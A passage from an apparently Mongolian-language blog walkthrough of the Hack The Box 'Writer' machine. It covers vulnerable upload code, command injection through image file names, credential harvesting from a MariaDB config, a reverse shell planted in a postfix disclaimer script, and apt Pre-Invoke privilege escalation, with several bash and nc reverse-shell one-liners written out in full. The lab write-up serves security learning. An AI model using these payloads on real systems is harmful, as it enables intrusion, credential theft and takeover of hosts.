</span></span><span style="display:flex;"><span>			im <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(image) 
</span></span><span style="display:flex;"><span>			im<span style="color:#f92672">.</span>verify()
</span></span><span style="display:flex;"><span>			im<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>			image <span style="color:#f92672">=</span> image<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;/tmp/&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>			os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;mv /tmp/</span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> /var/www/writer.htb/writer/static/img/</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(image, image))
</span></span><span style="display:flex;"><span>			image <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/img/</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(image)
</span></span><span style="display:flex;"><span>		    <span style="color:#66d9ef">except</span> PIL<span style="color:#f92672">.</span>UnidentifiedImageError:
</span></span><span style="display:flex;"><span>			os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;rm </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(image))
</span></span><span style="display:flex;"><span>			error <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Not a valid image file!&#34;</span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;add.html&#39;</span>, error<span style="color:#f92672">=</span>error)
</span></span></code></pre></div><p>Post хэсэгт image upload хийхээр болсон.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo -n <span style="color:#e6db74">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1&#39;&#34;</span> | base64
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>touch <span style="color:#e6db74">&#39;1.jpg; `echo &lt;BASE64 ENCODED PAYLOAD&gt; | base64 -d | bash `;&#39;</span>
</span></span></code></pre></div><p>Бэлдээд stories хэсгийн зургийг re-upload хийнэ. Орсон эсэхийг <code>static/img</code>-с ороод шалган орсон байгаа бол энэ удаад burp - дамжуулж image_url хэсгийг өөрчилнө. Image нэр хэсэгт jpg хэсгийн ар талыг арилгав.</p>
<pre tabindex="0"><code>file:///var/www/writer.htb/writer/static/img/1.jpg; `echo &lt;ENCHODED PAYLOAD&gt; | base64 -d | bash `;
</code></pre><h3 id="6-enumeration">6. Enumeration</h3>
<p>Services шалгаж үзнэ</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">### ss -tupln</span>
</span></span></code></pre></div><p>/etc/mysql/mariadb.cnf - с username, password хараж болохоор байна.</p>
<pre tabindex="0"><code>www-data@writer:$ cd /etc/mysql
www-data@writer:/etc/mysql$ ls
conf.d
debian-start
debian.cnf
mariadb.cnf
mariadb.conf.d
my.cnf
my.cnf.fallback
www-data@writer:/etc/mysql$ cat mariadb.cnf
# The MariaDB configuration file
#
# The MariaDB/MySQL tools read configuration files in the following order:
# 1. &#34;/etc/mysql/mariadb.cnf&#34; (this file) to set global defaults,
# 2. &#34;/etc/mysql/conf.d/*.cnf&#34; to set global options.
# 3. &#34;/etc/mysql/mariadb.conf.d/*.cnf&#34; to set MariaDB-only options.
# 4. &#34;~/.my.cnf&#34; to set user-specific options.
#
# If the same option is defined multiple times, the last one will apply.
#
# One can use all long options that the program supports.
# Run program with --help to get a list of available options and with
# --print-defaults to see which it would actually understand and use.

#
# This group is read both both by the client and the server
# use it for options that affect everything
#
[client-server]

# Import all .cnf files from configuration directory
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

[client]
database = dev
user = djangouser
password = DjangoSuperPassword
default-character-set = utf8
</code></pre><p>Кyle-н нууг үг олох:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mysql -u djangouser -h 127.0.0.1 -p
</span></span><span style="display:flex;"><span>DjangoSuperPassword
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>show databases;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>use dev;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>show tables;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SELECT * FROM auth_user;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A<span style="color:#f92672">=</span>
</span></span></code></pre></div><p>hashcat ашгилаад тайлах бололтой. Мэдэхгүй болохоор бэлэн тайлсан үг ашиглсан. (marcoantonio)</p>
<p>Kyle-р дамжаад John руу</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh kyle@writer.htb
</span></span></code></pre></div><p>Мэйл илгээж disclaimer-р г trigger хийгээд дотор нь reverse shell хийнэ.
<code>/etc/postfix/disclaimer</code></p>
<pre tabindex="0"><code>bash -i &amp;&gt;/dev/tcp/&lt;YOUR IP&gt;/&lt;PORT&gt; 0&gt;&amp;1
INSPECT_DIR=/var/spool/filter
SENDMAIL=/usr/sbin/sendmail
</code></pre><p>Эхний мөр trigger хийнэ.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> smtplib
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>
</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">25</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>From <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;kyle@writer.htb&#39;</span>
</span></span><span style="display:flex;"><span>To <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;john@writer.htb&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74"> Subject: HI THERE! JOHN
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> OOPS I GOT YOU MATE.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        io <span style="color:#f92672">=</span> smtplib<span style="color:#f92672">.</span>SMTP(host,port)
</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>ehlo()
</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendmail(From,To,Message)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> Exceptions <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>        print (e)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">finally</span>:
</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>quit()
</span></span></code></pre></div><pre tabindex="0"><code>python3 script.py
</code></pre><p>nc асаагаад тэгээд John руу орохыг хүлээнэ. John ороод id_rsa авна. Хуулж аваад ssh хийхээс өмнө  <code>chmod 600</code> хийгээд нэвтрэн орно.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -i id_rsa john@writer.htb
</span></span></code></pre></div><p>John <code>/etc/apt/apt.conf.d</code> - бичилт хийх боломжтой байна. Management group-т байна.</p>
<p><code>pspy64s</code> суулгана.
Local</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkdir www
</span></span><span style="display:flex;"><span>cd www
</span></span><span style="display:flex;"><span>mv ~/dir/pspy64s .
</span></span><span style="display:flex;"><span>python3 -m http.server
</span></span></code></pre></div><p>Machine</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl &lt;local ip&gt;:8000/pspy64s -o pspy64s
</span></span><span style="display:flex;"><span>chmod +x pspy64s
</span></span><span style="display:flex;"><span>./pspy64s
</span></span></code></pre></div><h3 id="7-exploitation">7. Exploitation</h3>
<p><a href="https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/">https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;apt::Update::Pre-Invoke {&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;YOUR IP&gt; &lt;PORT&gt; &gt;/tmp/f&#34;};&#39;</span> &gt; /etc/apt/apt.conf.d/00-pwn
</span></span></code></pre></div>]]></content:encoded>
    </item>
  </channel>
</rss>
